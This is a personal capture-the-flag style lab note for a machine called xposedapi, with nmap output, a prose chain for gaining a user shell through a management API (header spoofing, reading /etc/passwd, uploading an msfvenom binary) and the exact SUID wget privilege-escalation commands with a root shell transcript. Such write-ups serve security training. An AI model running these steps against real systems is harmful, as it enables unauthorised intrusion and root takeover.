[[Active Notes Template]]
## Provided Credentials
---

```

```

```

```

---
## Open Ports

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

```powershell
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)


13337/tcp open  http    Gunicorn 20.0.4
|_http-title: Remote Software Management API
|_http-server-header: gunicorn/20.0.4
```


---
## Software Versions

```powershell

```


---
## Discovered Subdomains




---
## Discovered Credentials

clumsyadmin

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---
## Attack Angles





---
## Steps to User.txt

port 13337 is api showing /restart, /logs, /update

Bypass logs with X-Forwarded-For Header, read /etc/passwd to discover user clumsyadmin

Use /update to download elf file by msfvenom using user clumsyadmin using api.

Use restart curl request to force restart > shell obtained

Flag at local.txt

---
## Steps to root.txt


/usr/bin/wget open. GTFOBin shows

```powershell
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```

```powershell
clumsyadmin@xposedapi:/tmp$ ls -la
total 108
drwxrwxrwt  9 root        root         4096 Jun  6 04:52 .
drwxr-xr-x 18 root        root         4096 Feb  9  2021 ..
drwxrwxrwt  2 root        root         4096 Aug  3  2024 .ICE-unix
drwxrwxrwt  2 root        root         4096 Aug  3  2024 .Test-unix
drwxrwxrwt  2 root        root         4096 Aug  3  2024 .X11-unix
drwxrwxrwt  2 root        root         4096 Aug  3  2024 .XIM-unix
drwxrwxrwt  2 root        root         4096 Aug  3  2024 .font-unix
-rw-r--r--  1 clumsyadmin clumsyadmin  4331 Jun  6 04:43 cf31-probe-1035.py
-rw-r--r--  1 clumsyadmin clumsyadmin  4331 Jun  6 04:48 cf31-probe-4641.py
-rw-r--r--  1 root        clumsyadmin 55098 Dec 23  2023 lse.sh
drwx------  3 root        root         4096 Aug  3  2024 systemd-private-b5ee8b8bc4ae4b5ea16459e9fa52032e-systemd-timesyncd.service-1sU5pA
drwx------  2 root        root         4096 Aug  3  2024 vmware-root_404-566859307
```

So write into cf31-probe-1035.py in tmp directory and execute SUID wget to achieve root

```powershell
clumsyadmin@xposedapi:/tmp$ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' > /tmp/cf31-probe-1035.py
clumsyadmin@xposedapi:/tmp$ chmod +x cf31-probe-1035.py
clumsyadmin@xposedapi:/tmp$ /usr/bin/wget --use-askpass=/tmp/cf31-probe-1035.py 0
# whoami
root
# cat /root/proof.txt
```



---

## User Flag

```

```

## Root Flag

```

```